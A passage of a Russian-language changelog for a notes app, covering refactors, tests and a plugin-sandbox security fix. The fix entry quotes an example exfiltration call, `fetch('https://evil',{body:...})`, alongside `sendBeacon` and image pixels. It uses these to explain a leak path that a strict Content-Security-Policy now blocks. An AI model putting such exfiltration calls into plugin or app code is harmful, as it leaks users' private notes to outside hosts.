...
### Безопасность · Плагин-песочница: egress-контейнмент iframe + строже валидатор каталога (security-хардининг)
...
- **🔴 Egress-контейнмент плагинного iframe (THREAT_MODEL T2).** Sandbox-iframe (`allow-scripts`, opaque
  origin) закрывал DOM/storage/родителя, но НЕ сетевой выход: плагин, прочитав заметку через брокер, мог
  `fetch('https://evil',{body:текст})` / `img.src` / `navigator.sendBeacon` ПРЯМО из iframe, минуя
  brokerный net-allowlist/SSRF-гард (app-CSP на srcdoc в этом WebView не энфорсится). Фикс: собственная
  ЖЁСТКАЯ CSP первым `<meta http-equiv="Content-Security-Policy">` в `<head>` srcdoc через единый хелпер
  `withPluginCsp` (константа `PLUGIN_CSP`): `default-src 'none'; script-src 'unsafe-inline'; style-src
  'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; form-action
  'none'; frame-src 'none'; base-uri 'none'`. `connect-src 'none'` глушит fetch/XHR/beacon/img-пиксель
  наружу; `unsafe-inline` для script/style держит UI-JS живым; `postMessage` не подпадает под
  `connect-src` → единственный outlet плагина остаётся broker-путь (`net.fetch` через GuardedClient).
  Единая точка вставки — будущий загружаемый srcdoc (PLUG-2) наследует контейнмент. Регресс-пин unit'ами
  (точная CSP первым meta в `<head>`; демо без внешних URL/`fetch`) (`apps/desktop/src/lib/plugin-host.ts`).
...
(п1 — байт-прежние user-facing строки; п2 — байт-прежнее поведение каждого undo-пути; новое ledger-поле
обратно-совместимо). Пункт 2 SECURITY-смежен (undo восстанавливает данные) — инварианты не ослаблены.

- **п1 — socket-диагностика ×3→1.** Снят тройной дубль клиентской AF_UNIX-диагностики (аудит
  «socket-диагностика ×3»): разбор `symlink_metadata` (нет файла vs не-сокет) и handshake-проба
  `initialize` жили тремя копиями (`nexus-cli::cmd_status`, desktop `settings::probe_local_socket`/
  `classify_socket`, desktop `agent_backend::connect`). Канон в `nexus-core/agent/connect/afunix.rs`
  (рядом с bind-side `prepare_socket_path`): `classify_socket(path) -> SocketDiag{Usable|NotSocket|Missing}`
  (логика `_ => Usable` сохранена) + `probe_initialize(transport, timeout) -> Result<String, ProbeError>`
  (send→recv(timeout)→извлечь `version`). Общие тексты (send-fail/timeout/closed) байт-идентичны → несёт
  канон через `ProbeError::Message`; **byte-prev** сообщения трёх сайтов НЕ идентичны (site-3 путь первым;
  site-1 NotFound — иной шаблон) — не «hint-суффикс», поэтому каждый колл-сайт форматирует СВОЙ прежний
  текст по вердикту канона. Характеризационные тесты пинят точные строки на всех трёх сайтах + канон-тесты
  classify/probe в ядре.
- **п2a — undo UndoOpts.** Схлопнуты 3 публичных враппера `undo_run`/`undo_run_full`/`undo_run_with_driver`
  в ЕДИНЫЙ `undo_run(run_id, canon_root, ledger, UndoOpts)`; внутренний дедуп `undo_run_inner` СОХРАНЁН как
  impl (тело не тронуто — поведение байт-прежнее). `UndoOpts` (Default = прежнее vault-only) + билдер
  `with_skills_root`/`with_driver` заменяет три сигнатуры с разными наборами None-хвостов. Вызыватели
  обновлены: agentd `sandbox` (`with_driver`), connect `handler` (`UndoOpts{skills_root, driver:None}`),
  vault-only (cli/desktop/тесты) — `UndoOpts::new()`.
- **п2b — типизированный домен корня + миграция.** Прежний выбор корня отката (строковая эвристика
  `tool_name=="skill_save"`) ТИПИЗИРОВАН: `UndoDomain{Vault, Skill}` + НОВОЕ ledger-поле `undo_domain`
  (**миграция 028** `agent_actions_undo_domain.sql`, nullable, append-only). Запись: apply проставляет домен
  по своей spec (NOTE_SPEC→Vault, SKILL_SPEC→Skill) на call-site finish; exec-GitOp → `None`. Чтение:
  `undo_root_for` читает домен типизированно, для NULL/битого падает на `UndoDomain::from_tool_name` (точное
...
- Гейт: `cargo fmt --all --check` ✅ / `clippy --workspace --all-targets -D warnings` ✅ /
  ...
  git_sync 6, acp_e2e 1, acp_server_e2e 1 — 0 failed); `#[ignore]`-паритет цел (не вводился).
...
**Контекст:** F-9 (news-пилот) оставил i18n-ключи модулей в монолитных `i18n/{ru,en}.json` как
отдельную фичу «i18n-EP». F-9b — этот хвост: вынести ключи модулей в файлы рядом с модулем (per-module
namespace).

**Решение (по разведке — вариант «отложить»):** физический вынос НЕ окупается. Ключевые факты
(числа — `ru.json`, 1296 листьев):
- у сторонних плагинов **уже есть свой путь i18n** — рантайм-namespace `plugin` (`ui.addTranslations`,
  AC-I18N-7, live-проверено); монолит = **first-party**-строки, дробление их per-module north-star
  «модуль самодостаточен для third-party» не двигает;
- ключи модулей **переплетены с ядром**: shared-объекты `commands` (12 модульных `view.<mod>` +
  9 ядровых) и `settings` (`settings.news`=модуль, но `settings.agent`(28)=ЯДРО — ai-секция); shared-ns
  `conflict`(29)+`git`(27) читают И ядровой `ConflictResolver` И `sync`; ядровой `commands-core` читает
  `chat.memorySaved`/`board.promote.*` (7 листьев) → «delete module → строки уходят чисто» ложно;
  `sync` собственных строк почти не имеет (единственный лист — `commands.view.sync`);
- сплит ухудшает процесс переводов (`settings`/`commands` разъезжаются по файлам) и **НЕ даёт
  байт-идентичный bundle без order-preserving-машинерии**.

**Характеризационное доказательство (feasibility, uncommitted scratchpad, не в дереве):** декомпозиция
монолита на per-module-фрагменты + deep-merge обратно даёт **content-identical=True** для обеих локалей
(миграция БЫЛА бы behavior-preserving), но **byte-identical=False** (вырезание+вклейка переупорядочивают
ключи) — сама по себе цена. Разбивка: ~535/1296 ru-ключей ушли бы в фрагменты, 761 остался ядром.

**Триггер пересмотра:** сторонний модуль, которому монолит не подходит (у него уже есть `plugin`-ns),
ЛИБО неуправляемый рост монолита. Запись — `BACKLOG.md`.

**Гейт (нулевой дифф кода → зелёный без изменений):** i18n vitest ✓ (5/5) · tsc ✓ · eslint ✓ ·
check-module-boundary ✓ · e2e 28 ✓.
...
это просто долгая обработка или процесс где-то пошёл не так». W-39 дал ПОСТ-фактум диагностику, W-2 —
баннер мёртвого LLM после прогона; живого «на каком этапе и живо ли оно» ВО ВРЕМЯ прогона не хватало.

**Механизм — поверх существующей джоб-инфры, БЕЗ новой шины.** Пайплайн `news/run.rs` уже эмитил
этапы через колбэк `NewsProgress` (`vault.rs` → tauri-событие `news:progress`: `sources` → `llm` →
`digest` → `save`), а планировщик уже отдавал `activeJobs`/`deadJobs`. Rust НЕ трогали (0 изменений) —
всё сведено на фронте как честная интерпретация уже идущих сигналов.

- **Единый источник статуса — стор `stores/news.ts`.** Этап живого прогона (`stage`) переехал из
  локального стейта `NewsView` в стор; подписка на `news:progress` живёт на УРОВНЕ СТОРА
  (`ensureProgressSubscription`, ревью MAJOR-1) — уход со вкладки во время прогона не слепит
  вотчдог и не теряет этап для атрибуции смерти.
- **⚠️ Семантика очереди (ревью CRITICAL-1/2).** `newsfeed` — recurring: после КАЖДОГО завершения
  воркер тут же кладёт pending «на завтра» (`reschedule_if_absent`), а `list_active`/`is_kind_busy`
  отдают pending с ЛЮБЫМ `run_at`. Поэтому «текущий прогон» выбирается клиентским фильтром
  `selectCurrentRun` (ready-семантика, зеркало Rust `has_ready_job`: `running` ИЛИ `pending` с
  наступившим `run_at`) + фиксацией id найденной джобы (переживает ретрай-бэкофф). **Это же чинит
  КОРЕНЬ жалобы владельца:** `load()` раньше считал `refreshing` через `jobActive` (`is_kind_busy`) —
  «завтрашняя» pending держала спиннер «Собираю…» ВЕЧНО; теперь — тот же ready-фильтр по `activeJobs`.
- **Ливнес «похоже, зависло» (мягко, не ошибка).** Чистая склейка `evaluateQueue` =
  `selectCurrentRun` + `attributeDeath` + `evaluateRun` разводит «долго/живо» и «встало/умерло»:
  `running` без движения прогресса дольше `STUCK_MS` (120с) и 2 подряд stuck-тика (гистерезис,
  ревью MINOR-1) → мягкий баннер `news.stuck` (не убивает джобу). Прежний вотчдог (`pending`>60с /
  наблюдение>20мин → `stalled`) сохранён как жёсткий бэкстоп; IPC-сбои опроса ограничены тем же
  потолком (ревью MINOR-3).
- **Честная ошибка ЭТАПА при смерти прогона.** Джоба ушла в `dead` → баннер `news.diedAt` (role=alert)
  называет ЭТАП (последний виденный `news:progress`) и причину (`last_error`) вместо вечного
  «Собираю…». Атрибуция смерти — по зафиксированному id джобы, без id — только смерти ПОСЛЕ старта
  наблюдения (ревью MAJOR-2: старая dead-запись не «убивает» успешный ретрай). НЕ дублирует
  W-2-баннер `llmDown` — уступает ему. `load()` при обнаружении живого прогона снимает устаревший
  `died` (ретрай из модалки очереди, ревью MINOR-2).
- **Ливнес работает и для ПЛАНОВОГО прогона:** вотчдог поднимается из «Обновить», из `load()` при
  живом прогоне и по первому `news:progress` (гард `watchdogActive` против двойного цикла).
  Финальный проход ревью: `load()` учитывает tracked id вотчдога — бэкофф-джоба (pending с
  `run_at` за ready-зазором) не гасится чужим `jobs:changed` (MINOR-A); взвод из `onProgress`
  не стирает только что записанные прогресс-метки (MINOR-B: смерть после первого события
  планового прогона атрибутируется этапом); отклонённый `listen` сбрасывает флаг подписки
  (повтор на следующем входе, NIT).
- **Мок-паритет (MEM-5).** Добавлена мок-шина событий (`bridge.ts::mockEmit`/`subscribe`): мок ленты
  (`mock/news.ts::refresh`) эмитит те же этапы `news:progress`, что бэкенд, — живой статус виден в
  браузер-превью, а не мёртвый код. Тесты: склейка `evaluateQueue`/`selectCurrentRun` на
  РЕАЛИСТИЧНЫХ снапшотах очереди (с recurring-pending «на завтра» — done/died достижимы),
  `evaluateRun`, `onProgress`, `load()` при живом прогоне, рендер зависания (role=status) /
  смерти (role=alert) / этапа-со-счётчиком. i18n RU/EN: `news.stuck`, `news.diedAt`,
  `news.diedAtUnknown`, `news.diedReasonUnknown`, `news.stageLabel.{sources,llm,digest}`.
...
- **Реестр оверлеев (`overlayRegistry`, по образцу `viewRegistry` F-8):** `overlays.register({ id, titleKey, isOpen, order, component })` — Map-реестр, `list()` детерминирован (сортировка по `order`), `get(id)`, идемпотентность (повторный id заменяет). `OverlayContribution.isOpen: (state: UIState) => boolean` — **селектор из ui-стора** (читает существующие `*Open`-були). Добавлен в `ModuleContext` (`ctx.overlays`) — модуль F-10b регистрирует свой оверлей через контекст (проводка = `module-manager.buildContext`, авто-трек в `subscriptions`, dispose скопом).
- **`OverlayOutlet` (`components/workspace/OverlayOutlet.tsx`, по образцу `MainViewOutlet` F-8):** рендерит `overlayRegistry.list()`, для каждого вычисляет `isOpen(uiState)` и, если открыт, — панель через **per-contribution ErrorBoundary** (`key` по id). Заменяет 7 хардкод-строк App.tsx. Подписка на весь ui-стор (`useUIStore()`) — `isOpen`-селекторы непрозрачны; счастливый путь — **0 лишних DOM-узлов** (ErrorBoundary без обёртки, F-8), якоря панелей не смещаются.
- **Ядровые оверлеи легализованы (`lib/connector/core-overlays.ts`, по образцу `core-views.ts`):** 7 оверлеев (goals/memory/episodes/tasks/inbox/digest/contradictions) регистрируются напрямую (каркас, НЕ модуль — как `registerCoreViews`), сайд-эффектом при импорте из App.tsx. order 10..70 сохраняет **прежний DOM-порядок** App.tsx (важно для стекинга независимых floats digest/contradictions поверх trap-оверлеев). `isOpen`/`component` перенесены КАК ЕСТЬ.
- **App.tsx:** 7 строк `{xOpen && <Panel/>}` → `<OverlayOutlet/>`; убраны 7 подписок `useUIStore((s) => s.xOpen)` и 7 импортов панелей (ядро больше не импортирует эти панели — приходят из реестра). `{tweaksOpen && <SettingsView/>}` НЕ трогали (Настройки — не в наборе 7; вне скоупа среза). Поведение идентично (те же панели/условия + изоляция на каждой).
- **titlebar-menu-реестр — ОТЛОЖЕН (обосновано, честный TODO):** AI-инсайты-меню Titlebar (digest/goals/contradictions) **оставлено ядро-chrome** для v0. Причины: (1) titlebar-menu-реестр = новый тип вклада + реестр + поле контекста + рефактор Titlebar + тесты — НЕ тривиален как overlays (те дословно зеркалят viewRegistry); (2) **не нужен для разблокировки F-10b** — 7 вырезов требуют оверлей-реестра, а пункт меню может остаться ядром, вызывая `openX()` (стейт `*Open` уедет в модули лишь в F-10b); (3) добавление реестра «не нужного 7 оверлеям» = нарушение скоуп-дисциплины (YAGNI). Прецедент — `DeadJobsModal` знает job-kind'ы (ядро-chrome-знание фич приемлемо в v0). Пункты-меню = ядро-chrome (задокументировано в `docs/dev/connector.md`).
- **Стейт оверлеев НЕ перенесён:** `*Open`-були остаются в ui-сторе; `isOpen` читает их КАК ЕСТЬ. Перенос стейта/удаление ядро-ссылок на панели = вырезание F-10b (тогда каждый оверлей уедет в свой модуль через `ctx.overlays`).
- **v0-коупл (задокументирован):** `OverlayContribution.isOpen` типизирован против `UIState` (ui-стор — источник флагов ядровых оверлеев). Store-agnostic абстракция состояния оверлея отложена вместе с прочим north-star плагинов (YAGNI, как apiVersion/capabilities F-8). `UIState` экспортирован из `stores/ui.ts` (type-only импорт в `connector/types.ts`, цикла нет).
- **Тесты (оракулы):** `overlays.test.ts` — register/get/list-детерминизм/dispose/идемпотентность + легализация 7 ядровых (порядок 10..70) + `isOpen`-селекторы читают верные `*Open`-були. `overlay-isolation.test.tsx` — тест-модуль через `ctx.overlays` регистрирует падающий оверлей (цепочка module → overlays-реестр → OverlayOutlet → ErrorBoundary, та же что вырежет F-10b): рендер НЕ падает, хром жив, плашка + reload; контроль — нормальный оверлей без плашки; закрытый — 0 DOM-след. **P0-3 e2e overlays.spec** пинит открытие/Esc каждого из 7 оверлеев КАК РАНЬШЕ.
- **Готово для F-10b:** `ctx.overlays.register(...)` в контексте; шаблон выреза оверлея = (1) панель регистрируется через `ctx.overlays` в модуле, (2) убрать её из `core-overlays.ts`, (3) перенести `*Open`-стейт в модуль. OverlayOutlet и ErrorBoundary-изоляция готовы.
- Гейт: tsc `--noEmit` / eslint `--max-warnings 0` / vitest **1376 зелёных** (131 файл, +8 F-8c-тестов) / vite build / **P0-3 e2e 28 зелёных** — без пайпов; locale ru-RU в конфиге. Rust не трогали.
...
### Изменено · R-12 — мелкие хвосты дедупа: db::settings канон + wire-rows From-импл (2 из 4 пунктов)

Стадия R-12 REFACTOR-PLAN (батч мелких дедупов из реестра аудита). **Behavior-preserving.** Жёсткая скоуп-дисциплина: из 4 намеченных пунктов сделаны 2 зелёных (безопасных), 2 отложены в **R-12b** (выходят за скоуп/риск). Ничего не переписано — сняты дубли из реестра.

- **п.2 db::settings канон (аудит «db-settings ×5»):** новый `crates/nexus-core/src/db/settings.rs` — единственная точка raw-SQL по таблице `settings`: `get` (`SELECT value FROM settings WHERE key=?1` → `Option<String>`), `set` (upsert `ON CONFLICT(key) DO UPDATE`), `delete`. Свёрнуты поле-в-поле копии в трёх nexus-core-модулях: `contradictions::{is_enabled,set_enabled}`, `episode::{is_enabled,set_enabled}`, `plugin::{set_enabled,is_enabled,clear_settings}`. Булеву интерпретацию ("1"/"0", дефолт OFF у contradictions/episode, дефолт ON `!= "0"` у plugin) держит КАЖДЫЙ вызыватель у себя — канон оперирует строками (семантики разные, не унифицируем). НАМЕРЕННО вне канона: `vector::reconcile_embedding_model` (пишет настройку ВНУТРИ бо́льшей атомарной транзакции — дробить на отдельные `writer().call` нельзя без потери атомарности) и `plugin::disabled_dirs` (`LIKE`-prefix-скан, иная форма). Убран ставший неиспользуемым `use rusqlite::OptionalExtension` в `plugin/manage.rs`. +3 юнита канона (get-absent/upsert-roundtrip/delete-idempotent).
- **п.4 wire-rows вместо DTO-пассивов (src-tauri, аудит «DTO-пассивы run_store→DTO»):** `From`-имплы `run_store::{AgentSessionRow,PersistStep,PersistedTurnRow} → {AgentSessionDto,PersistedStepDto,PersistedTurnDto}` в `commands/agent.rs`; инлайн-`.map`-замыкания в `agent_sessions_list`/`agent_session_load` свёрнуты в `.map(Dto::from)`. Форма DTO/serde-`camelCase` НЕ менялись — **контракт фронта тот же JSON** (единственная санкционированная правка src-tauri по скоупу п.4).
- **СДЕЛАНО в R-12b** (оба отложенных пункта закрыты — см. запись «R-12b» вверху Unreleased):
  - **п.1 socket-диагностика ×3→1** — ✅ канон `classify_socket`/`probe_initialize` в `agent/connect/afunix.rs`, route CLI+settings+agent_backend. Реальность строк оказалась расходящейся сильнее «hint-суффикса» (site-3 путь первым; site-1 NotFound иной шаблон) → канон возвращает ВЕРДИКТ (`SocketDiag`) + типизированный `ProbeError`, а байт-прежний текст форматирует каждый колл-сайт; характеризация пинит строки.
  - **п.3 undo UndoOpts + типизированный домен корня** — ✅ `undo_run(UndoOpts)` (3 враппера схлопнуты, `undo_run_inner` сохранён); `UndoDomain{Vault,Skill}` + миграция 028 `undo_domain` (nullable) с `tool_name`-fallback для старых строк; обязательный тест на историческом фикстуре + миграция-тест «свежая/старая БД». Инварианты undo не ослаблены.
- Гейт: `cargo fmt --all --check` + `clippy --workspace --all-targets -D warnings` + `test --workspace` без пайпов; `check-ignored`/`check-tooluse`/`check-traceability` зелёные; `#[ignore]`-паритет цел.
...
- **Чистый вынос в 5 подмодулей `nexus-agentd/src/` (логика/сигнатуры не менялись):** `startup.rs` (325) — разбор env/argv (`log_level_from_env`/`vault_path_from_args`), резолв app-config-dir + RESTORE owner-kill-switch'ей (`egress.json`/`agent.json`) + SIGUSR1-тоггл; `sandbox.rs` (358, unix) — CLI-входы `--sandbox-child`/`--sandbox-run`/`--sandbox-undo`; `connect.rs` (80, unix) — `maybe_spawn_connect_server` (AF_UNIX-хостинг коннектора); `rag.rs` (304) — `RagBundle`+`build_rag_min` (vault-состояние RAG); `smoke.rs` (475) — headless smoke-харнесс. Тесты переехали к своему коду (R-5b/R-6-конвенция): sandbox-undo-разбор → `sandbox.rs`; egress/pause/config-dir → `startup.rs`; boot_*-характеризация провайдеров → `rag.rs`; `live_actuator_gate_applies_via_gate` → `smoke.rs`. `main.rs` (703) остаётся тонким wiring: `main()` (диспетч sandbox-флагов), `run()` (композиционный корень), `build_skill_context`; smoke-блок `run()` вынесен в `smoke::run_smoke`.
- **B8 (ДЕКЛАРИРУЕМОЕ поведенческое изменение smoke-пути, НЕ прод-пути):** `assert_eq!`/`assert!`/`.expect()`-паники smoke в release убраны — `agent_loop_smoke`/`actuator_gate_smoke`/`drive_actuator_gate_run` возвращают `Result<_, String>` с честной диагностикой; `run()` пробрасывает `?` → `main()` логирует и `exit(1)` ВМЕСТО `panic!`. Успешный smoke — exit 0 как прежде; провал теперь — чистый exit-1 с сообщением, не паника/бэктрейс. CI-тест `live_actuator_gate_applies_via_gate` адаптирован (`.expect()` на новый `Result` движка); **ожидания ассертов НЕ менялись** (те же snapshot-строки записанного файла/ledger/статуса).
- **Cargo-feature `smoke` (аддитивна):** форсит smoke на КОМПИЛЯЦИИ (self-testing бинарь) как альтернатива рантайм-`NEXUS_AGENTD_SMOKE=1`. Default-профиль (без фичи) собирается и ведёт себя как прежде (env-gated). Docker/CI собирают БЕЗ фичи (`cargo build --release -p nexus-agentd`) — поведение образа неизменно. Оба профиля (`default` + `--features smoke`) собираются, проходят clippy `-D warnings` и тесты офлайн; live-smoke обоих бинарей на temp-vault — exit 0 (три проверки: actuator-gate apply `status=done`, цикл агента, agent_run до терминала).
- **bootstrap-хвост:** сборка провайдеров уже КАНОН `bootstrap::ProviderSet` (R-3a) — доносить нечего; `build_rag_min` остаётся vault-состоянием RAG (не дубль ядра). Гейт: `cargo fmt`/`clippy --workspace --all-targets -D warnings`/`test --workspace` без пайпов; `#[ignore]`-паритет; `check-ignored`/`check-tooluse`/`check-egress`/`check-agent-memory` зелёные; agentd 19/19 тестов. Размер main.rs: 2120→703.

### Изменено · R-10 — ai/chat.rs распил: provider.rs + fenced/neutralize + vector_recall дедуп

Стадия R-10 REFACTOR-PLAN (thermo-смелл — ai/chat.rs 1985 строк, 2-й по размеру). **Behavior-preserving; анти-инъекция (AC-SEC-7) и Debug-канон провайдера неизменны.** Двухкоммитный паттерн: оракул-снимки ДО дедупа → канон с теми же байтами. `check-tooluse` (OpenAiToolProvider не протёк в chat-путь) / `#[ignore]`-паритет 31/31 целы.

- **Вынос транспорта в `ai/provider.rs` (чистый move):** `ChatProvider`-трейт + `OpenAiChatProvider` (SSE-насос `stream_chat`/`stream_chat_reasoning`, retry инициации P0-d `retry_request`/`RetryPolicy`/классификаторы, cold-start-aware таймауты первого токена/idle, `SseEvent`/`parse_sse_delta`) + 15 транспорт-тестов. `chat.rs` остаётся промпт-билдерами (RAG/память/эпизоды/pinned/web/inline) + wire-типы `ChatMessage`/`ToolCallMsg`/`ToolCallFn`. Оракул — Debug-снимок `OpenAiChatProvider { … RetryPolicy … }` в nexus-agentd (19 тестов, байт-идентичность канона). Внешние пути `crate::ai::ChatProvider`/`OpenAiChatProvider` целы (реэкспорт). Размер: chat.rs 2019→1182, provider.rs 907.
- **Канон fenced-block/neutralize_marker (дедуп):** `neutralize_marker(text, marker) -> Cow<str>` (вхождение маркера в теле → `⟨marker⟩`; пустой маркер не трогаем; Borrowed без аллокации) — две inline-копии (`fence_observation` + `build_note_summary_messages`) свёрнуты. `fenced_entry(marker, label, body)` = `{marker}\n{label}\n{body}\n{marker}\n\n` — 4 ОДНОРОДНЫХ префикс-билдера (память переписки/факты/эпизоды/закреплённые) переведены; нумерованные `[n]` RAG/web НЕ тронуты (негомогенны). Пороги/truncate инъекции (MEM-10 280 / EP-2 400) — параметром, не унифицированы. Оракул `fenced_wrapping_byte_snapshot`.
- **Канон vector_recall (`crate::vector`):** `embed_and_search(vectors, embedder, query, overfetch)` (унифицирует `embed_query → map_err(External) → search → map_err(External)`) + `hits_above_threshold(hits, t) -> Vec<(i64,f32)>` (дополняет id-only `memory::ids_above_threshold`). 4 однородных ретривала (`context_facts`/`search_episodes`/`search_memory`/`plan_consolidation`) переведены. overfetch (`(k*4).max(8)` vs `CONSOLIDATE_S`) и 4 разных порога — ПАРАМЕТРОМ, не унифицированы. web/pinned НЕ тронуты (остаются фазами).
- **ОТЛОЖЕНО в R-10b (скоуп-дисциплина):** (1) унификация SSE-насоса chat↔tools в общий `sse_lines` — cancel-семантика РАЗНАЯ (chat→`Ok(full)`, tools→`Err(отменён)`), разные event/finalization-модели (`SseEvent` vs `ToolSseEvent` с `finish_reason=tool_calls`), retry только в chat; tools.rs питает AGENT/orchestrate-путь → риск; (2) вынос промпт-билдеров по фичам (websearch/memory). RecallChannel-трейт НЕ строится (критик отменил: блоки негомогенны). Гейт: `cargo fmt --check` + `clippy --workspace --all-targets -D warnings` + `test --workspace` зелёные; nexus-core lib 1117 passed / 20 ignored.
...
- **Дедуп конвейера (3→1):** три копии «propose→decide→transition» (`propose_and_decide` vault-changeset, `dispatch_skill_save` навык, `dispatch_exec_decision` exec) сведены к ОДНОМУ канону `run_proposal_round` (ядро: `record_before`-proposed + dup-lookup → `on_proposed` события/батч → `decide` → **kill-switch re-check** → transition proposed→approved). Три вызывателя стали ТОНКИМИ обёртками: строят `entry` + `LedgerCopy` (по-фичевые ledger-текстовки — параметром, НЕ унифицированы) + `on_proposed`-замыкание (Proposal+Diff у vault/навыка, ExecProposal у exec) + свою apply-дельту ТОЛЬКО на `Approved` (`apply_now` vault-rooted / `apply_skill_save` skills_root / exec-ничего). Вердикт канона — `ProposalVerdict{Approved|Rejected|Failed}` (вызыватель маппит в `DispatchOutcome` / `(DispatchOutcome, bool)` / `ExecDecision`).
- **KILL-SWITCH ИНВАРИАНТ централизован:** re-check паузы (`agent_paused`) ПОСЛЕ `decide` и ПЕРЕД `transition` теперь РОВНО В ОДНОМ месте (канон), на ВСЕХ трёх путях (было 3 копии). Семантика fail-closed идентична: под паузой строка остаётся `proposed` (одобрить снова на un-pause), запись/exec подавлены. Последний-момент guard (`apply_now`/`apply_skill_save`) и redeem-time re-check (`exec_host`) НЕ тронуты (отдельные стражи).
- **Вынос конвейера в подмодуль** `actuator/orchestrate/propose.rs` (по образцу R-5a/b): `apply_now` + канон + `LedgerCopy`/`ProposalVerdict` + три обёртки + `dispatch_exec_decision`/`ExecDecision`/`exec_proposal_summary`/`proposal_key` + ledger-аксессоры. Публичные имена реэкспортируются из `orchestrate` (`pub use propose::{dispatch_exec_decision, ExecDecision}`, `pub(in crate::actuator) use propose::dispatch_skill_save`) — ВНЕШНИЕ пути (`actuator::dispatch_exec_decision`, `exec_host`/`tools.rs`) НЕизменны. Общие хелперы гейта (`block_message`/`proposed_content`/`line_diff`/…) и `DispatchPolicy`/`DispatchOutcome` остаются в `orchestrate.rs`, подмодуль берёт их `use super::…`. Оракул `orchestrate/tests.rs` не тронут (только `#[cfg(test)]`-реимпорт в `orchestrate.rs` имён, которые прод-код гейта теперь не зовёт: `AgentEvent`/`ItemDecision`/`ProposalBatch`/`STATE_APPROVED`/`STATE_REJECTED` — тесты видят их через `use super::*`).
- **Размер `orchestrate.rs`: 1092 → 499 строк** (−593; вынесено 672 строки конвейера в `propose.rs`). **Цель `<1000` закрыта — смелл №5 снят.** Дедуп-эффект: канон+обёртки в `propose.rs` вместо трёх ~130-строчных копий.
- Гейт зелёный: `cargo fmt --all --check` ✅, `cargo clippy --workspace --all-targets -D warnings` ✅, `cargo test --workspace` ✅ (nexus-core 1108 passed / 20 ignored — идентично; `orchestrate::tests` 35/35; sandbox exec/skill-пути зелёные), `check-tooluse`/`check-traceability`/`check-ignored` (31/31) ✅.
...
### Изменено · F-2d — распил tauri-api: остаток доменов (barrel готов)

Финальный срез стадии F-2 фронт-волны REFACTOR-PLAN §4 (по образцу F-2a/b/c). **Behavior-preserving**: потребители (150+) НЕ правились — баррел `lib/tauri-api.ts` реэкспортирует вынесенное; Rust не тронут. Из tauri-api.ts вынесен ВЕСЬ остаток доменной логики — файл стал ТОНКИМ barrel'ом (1290 → 228 строк: только реэкспорты типов/объектов + сборка `tauriApi` из доменов; доменной логики нет).

- **Вынесенные домены `lib/api/<домен>/{types,index}.ts`** (каждый метод — через `bridge`, кроме честных исключений): `graph` (беклинки/упоминания/локальный+единый граф), `search` (searchVault/searchContent), `suggest` (связи/похожие/резюме/explainRelation/startingQuestions/suggestTags), `memory` (MEM CRUD + консолидация MEM-8), `episode` (панель эпизодов EP-3 + тоггл), `egress` (политика эгресса ядра net.md), `properties` (реестр типов PROP-2/3), `plugins` (Ф0-13/DP-8 брокер), `git` (git-sync Ф3/Ф4), `contradictions` (#vision + тоггл), `digest` (ADR-007 slice 4), `backup` (#59/W-9), `inline` (IL-1/2 стрим), `scheduler` (ADR-007 срез 5 очередь + `jobs:changed`), `home` (дашборд H1/H2/H6 + `home:widget-updated`), `settings` («хвост» AI-конфиг/agent-флаги + `websearch` W-3), `app` (мета W-20 + `external.open`).
- **Здравый смысл слоя (объединения по когезии, НЕ по одному методу):** `tasks` (TASK-1, плоский список) вложен в **board**-домен (обе фичи — задачи vault: `TaskItem`+`TaskCard`); `goals` (#35) вложен в **home**-домен (`GoalEntry` — поле `HomeData.goals`, тип-связка); `websearch` вложен в **settings** (спека «settings-хвост»); `external.open` — в **app** (нативная мета+OS-навигация); подписки `onJobsChanged`/`onWidgetUpdated` — в `schedulerEvents`/`homeEvents` их доменов; баррел собирает составные `events`/`settings` из доменных кусков под прежними именами.
- **Честные исключения из `bridge`** (перенесены ПРЯМЫМ `invoke`/`window.open` с комментом в СВОИХ доменах, как `chat.streamRag`/`agent.run` в F-2b/c): Channel-стрим `inline.complete` (канал+`onmessage`+`inline_cancel`); OS-диалоги `backup.exportToFile`/`importFromFile` (`saveDialog`/`openDialog`→`invoke`); OS-навигация `external.open` (браузерная ветка — прямой `window.open`, НЕ запрос к мок-бэкенду).
- **Кросс-доменные type-only импорты переведены на доменные источники** (их срезы приземлились): `chat/types.ts` берёт `SearchHit`←`search/types`, `EpisodeHit`←`episode/types`; `news/index.ts` — `LinkSuggestion`←`suggest/types`; `settings/types.ts` — `AgentConnectionDto`←`agent/types`; `search/index.ts` — `NoteRef`←`vault/types`. Все type-only (в рантайме стираются — цикла домен↔домен нет).
- **Ratchet инлайн-моков ВНИЗ 18 → 1.** 17 инлайн-заглушек переехали в `mock/*` и зовутся через `bridge`: новые `mock/app.ts` (version/buildInfo) и `mock/scheduler.ts` (counts/jobActive/restart/activeJobs/deadJobs/retryDead/clearDead ×7); добавки в `mock/board.ts` (listTasks), `mock/vault.ts` (generateDigest/generateContradictions/explainRelation/startingQuestions), `mock/home.ts` (staleRefresh), `mock/settings.ts` (стейтфул websearch get/setConfig). ОСТАВШАЯСЯ 1 — `external.open`: её браузерная ветка `window.open` — навигация ОС (НЕ мок-бэкенд), честное исключение, не инлайн-мок. `INLINE_MOCK_BASELINE` понижен 18 → 1 (история в комменте дополнена).
- **Parity-капкан (а) НЕ ослаблен:** `mock/parity.test.ts` по-прежнему выводит варианты из ТИПА `AgentStreamEvent` (`satisfies Record<Union['type'], true>`) из доменного источника `lib/api/agent/types`; капкан (б) для `ChatStreamEvent` — тоже (тип берётся через баррел-реэкспорт). Скоуп подсчёта — баррел + весь `lib/api/**`.
- Гейт: `tsc --noEmit` ✅, `eslint --max-warnings 0` ✅, vitest полный 1341/1341 + coverage (lines 86.1% ≥ 63) ✅, **Playwright e2e-смоук 28/28 (webkit, два независимых прогона)** ✅ (выделенный порт worktree, основное дерево не тронуто).

### Изменено · R-3e — hot-apply `set_ai_config` унифицирован на канон `bootstrap::ProviderSet`

Финальный срез серии R-3 (REFACTOR-PLAN §3, thermo-смелл №3), решение владельца (зафиксировано в BACKLOG R-3b). **ДЕКЛАРИРУЕМОЕ ПОВЕДЕНЧЕСКОЕ ИЗМЕНЕНИЕ** (НЕ behavior-preserving): последний остававшийся особый путь UI — hot-пересборка провайдеров после сохранения настроек — снят и переведён на тот же канон `ProviderSet::from_config`, что `open_vault`/agentd/cli. Дельта была заранее запинена фикстурной таблицей `settings.rs::tests::hot_*` (R-3b) — теперь она пинит уже каноническую семантику.

